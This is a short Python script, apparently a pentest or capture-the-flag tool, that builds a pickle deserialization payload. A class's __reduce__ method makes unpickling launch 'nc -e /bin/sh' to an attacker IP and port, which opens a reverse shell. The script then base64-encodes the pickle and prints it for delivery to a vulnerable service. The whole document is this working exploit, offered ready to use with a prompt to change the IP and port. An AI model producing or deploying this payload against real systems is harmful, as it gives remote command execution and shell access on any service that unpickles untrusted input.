import pickle
import base64
import subprocess

class Gen(object):
    def __init__(self, payload):
        self.payload = payload

    def __reduce__(self):
        return subprocess.Popen, (self.payload,)

# Payload is a tuple 
reverse_shell_payload = ("nc", "-e", "/bin/sh", "192.168.45.198", "1337") # change the IP and port 

# Pickle with protocol=4
reverse_shell_payload_pickled = pickle.dumps(Gen(reverse_shell_payload), protocol=4)

# Base64 encode
reverse_shell_payload_pickled_base64_encoded = base64.b64encode(reverse_shell_payload_pickled).decode()
print(reverse_shell_payload_pickled_base64_encoded)
